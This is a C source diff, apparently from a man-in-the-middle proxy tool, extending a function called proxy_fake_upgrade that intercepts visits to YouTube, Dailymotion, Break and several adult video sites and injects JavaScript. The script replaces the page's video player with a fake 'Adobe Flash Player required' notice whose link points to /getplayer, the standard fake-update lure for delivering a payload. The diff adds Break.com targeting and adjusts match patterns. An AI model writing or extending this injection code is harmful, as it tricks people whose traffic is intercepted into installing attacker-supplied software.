@@ -41,11 +41,12 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
    if (strstr(url, "www.youtube.com/watch") != NULL || 
        strstr(url, "www.veoh.com/watch") != NULL || 
        strstr(url, "www.metacafe.com/watch") != NULL || 
-       strstr(url, "www.dailymotion.com/video") != NULL || 
+       strstr(url, "www.dailymotion.com/video") != NULL ||
+       strstr(url, "www.break.com/video") != NULL || 
        strstr(url, "www.youporn.com/watch") != NULL ||
        strstr(url, "www.pornhub.com/view_video") != NULL ||
        strstr(url, "www.xvideos.com/video") != NULL ||
-       strstr(url, "xhamster.com/movies") != NULL ||
+       strstr(url, ".xhamster.com/movies") != NULL ||
        strstr(url, "www.porn.com/videos") != NULL ||
        strstr(url, "www.xnxx.com/video") != NULL) {
       char *data;
@@ -156,7 +157,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
                         "<p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then the installed version.</p><p style=\"margin:10px 0;\">" \
                         "Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" href=\"/getplayer\">" \
                         "<img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br>" \
-                        "Get the latest Flash Player</a></p></div>';\n" \
+                        "Get the latest Flash Player</a></p></div>';" \
 			"</script>\n");
          else if (strstr(url, "www.metacafe.com/watch") != NULL)
              ret = asprintf(&html_to_inject,
@@ -165,16 +166,25 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
                         "margin-bottom:50px;margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then " \
                         "the installed version.</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" " \
                         "href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\">" \
-                        "<br>Get the latest Flash Player</a></p></div>';\n" \
+                        "<br>Get the latest Flash Player</a></p></div>';" \
 			"</script>\n");
          else if (strstr(url, "www.dailymotion.com/video") != NULL)
              ret = asprintf(&html_to_inject,
 			"\n<script type='text/javascript'>" \
-                        "        document.getElementById('player_box').innerHTML = '<center><div style=\"font-size:14px;color:white;border:0px #999999 solid;padding:160px;" \
+                        "        document.getElementById('player_box').innerHTML = '<center><div style=\"font-size:14px;color:white;border:0px #999999 solid;padding:80px;" \
                         "margin-top:50px;margin-bottom:50px;margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer " \
                         "version then the installed version.</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><br><p style=\"margin:10px 0;\">" \
                         "<a style=\"font-size:10px;color:white;\" href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/" \
-                        "download_buttons/get_flash_player.png\"><br><br>Get the latest Flash Player</a></p></div></center>';\n" \
+                        "download_buttons/get_flash_player.png\"><br><br>Get the latest Flash Player</a></p></div></center>';" \
+                        "</script>\n");
+         else if (strstr(url, "www.break.com/video") != NULL)
+             ret = asprintf(&html_to_inject,
+                        "\n<script type='text/javascript'>" \
+                        "        document.getElementById('video-player').innerHTML = '<center><div style=\"font-size:14px;color:white;border:0px #999999 solid;padding:80px;" \
+                        "margin-top:50px;margin-bottom:50px;margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, " \
+                        "or a newer version then the installed version.</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><br><p style=\"margin:10px 0;\">" \
+                        "<a style=\"font-size:10px;color:white;\" href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/" \
+                        "download_buttons/get_flash_player.png\"><br><br><p style=\"margin:20px 0;\">Get the latest Flash Player</p></a></p></div></center>';" \
                         "</script>\n");
          else if (strstr(url, "www.youporn.com/watch") != NULL)
              ret = asprintf(&html_to_inject,
@@ -182,7 +192,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 			"        document.getElementById('videoWrapper').innerHTML = '<div id=\"no_flash_player_message\"><div id=\"getHtml5Player\"><div>Oh No!</div><div>" \
                         "We noticed you do not have Flash installed. Follow the link below to install Flash</div><br><a style=\"font-size:10px;\" href=\"/getplayer\"><img style=\"" \
                         "border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br><br><a style=\"font-size:10px;\"" \
-                        " href=\"/getplayer\">Get the latest Flash Player</a><br></div>';\n" \
+                        " href=\"/getplayer\">Get the latest Flash Player</a><br></div>';" \
 			"</script>\n");
          else if (strstr(url, "www.pornhub.com/view_video") != NULL)
              ret = asprintf(&html_to_inject,
@@ -202,7 +212,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
                         "color:white;\" href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\">" \
                         "<br><br><p style=\"margin:20px 0;\">Get the latest Flash Player</p></a></p></div></center>';" \
                         "</script>\n");
-         else if (strstr(url, "xhamster.com/movies") != NULL)
+         else if (strstr(url, ".xhamster.com/movies") != NULL)
              ret = asprintf(&html_to_inject,
                         "\n<script type='text/javascript'>" \
                         "        document.getElementById('player').innerHTML = '<center><div style=\"font-size:10px;color:white;border:0px #999999 solid;padding:160px;margin-top:50px;" \
@@ -245,13 +255,15 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
              bis.search = "id=\"SideCol\">";
          else if (strstr(url, "www.dailymotion.com/video") != NULL)
              bis.search = "class=\"pl_video_infos\">";
+         else if (strstr(url, "www.break.com/video") != NULL)
+             bis.search = "class=\"upload-form\">";
          else if (strstr(url, "www.youporn.com/watch") != NULL)
              bis.search = "style=\"clear:both;\"></div>";
          else if (strstr(url, "www.pornhub.com/view_video") != NULL)
              bis.search = "class=\"logoFooterWrapper\">";
          else if (strstr(url, "www.xvideos.com/video") != NULL)
              bis.search = "class=\"botLinks\">";
-         else if (strstr(url, "xhamster.com/movies") != NULL)
+         else if (strstr(url, ".xhamster.com/movies") != NULL)
              bis.search = "id='commentBox'>";
          else if (strstr(url, "www.porn.com/videos") != NULL)
              bis.search = "class=\"listComments\">";
